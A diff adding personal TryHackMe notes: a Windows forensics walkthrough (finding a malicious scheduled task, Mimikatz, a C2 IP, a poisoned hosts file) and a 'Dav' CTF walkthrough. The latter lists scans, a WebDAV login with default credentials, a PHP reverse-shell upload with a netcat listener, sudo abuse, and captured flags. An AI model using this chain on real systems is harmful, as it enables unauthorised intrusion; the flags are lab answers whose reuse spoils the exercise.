@@ -274,4 +274,92 @@ AHH_YOU_FOUND_ME
 
 #$ Investigating Windows
 tryhackme Investigating Windows walkthrough
-10.10.120.243
+10.10.228.218
+
+What’s the version and year of the Windows machine?
+Settings > system > about
+windows server 2016
+
+Which user logged in last?
+Administrator
+
+When did John log onto the system last?
+03/02/2019 5:48:32 PM
+
+What IP does the system connect to when it first starts?
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+10.34.2.3
+
+What two accounts had administrative privileges (other than the Administrator user)?
+net localgroup Administrators
+Guest Jenny
+
+Whats the name of the scheduled task that is malicous.
+Task Scheduler
+Clean file system
+
+What file was the task trying to run daily?
+nc.ps1
+
+What port did this file listen locally for?
+1348
+
+When did Jenny last logon?
+net user Jenny
+Never
+
+At what date did the compromise take place?
+03/02/2019
+
+At what time did Windows first assign special privileges to a new logon?
+03/02/2019 4:04:49 PM
+
+What tool was used to get Windows passwords?
+Get-FileHash .\mim.exe
+Mimikatz
+
+What was the attackers external control and command servers IP?
+ipconfig /displaydns | findstr "Record" | findstr "Name Host"
+76.32.97.132
+
+What was the extension name of the shell uploaded via the servers website?
+c:\inetpub\wwwroot
+.jsp
+
+What was the last port the attacker opened?
+netsh firewall show state
+In event viewer, navigate to
+Applications and Services Logs\Microsoft\Windows\Windows Firewall with Advanced Security\Firewall
+1337
+
+Check for DNS poisoning, what site was targeted?
+type C:\WINDOWS\System32\drivers\etc\hosts
+google.com
+
+# Dav
+tryhackme Dav walkthrough
+
+nmap -Pn -sC -A -T4 -sV 10.10.188.199 -oN nmap_result
+nmap -A -v 10.10.188.199
+
+gobuster dir -u 10.10.188.199 -w /usr/share/dirb/wordlists/common.txt
+
+10.10.188.199/webdav
+
+webdav default credentials
+https://thisiszzzombie.blogspot.com/2011/12/webdav-xampp-1.html
+user: wampp, pass: xampp and I was able to log in.
+
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+cadaver http://10.10.188.199/webdav
+put /home/kali/Dav/php-reverse-shell.php
+nc -lvnp 1234
+http://10.10.188.199/webdav/php-reverse-shell.php
+whoami
+cat /home/merlin/user.txt
+449b40fe93f78a938523b7e4dcd66d2a
+
+sudo -l
+
+sudo /bin/cat /root/root.txt
+101101ddc16b0cdf65ba0b8a7af7afa5
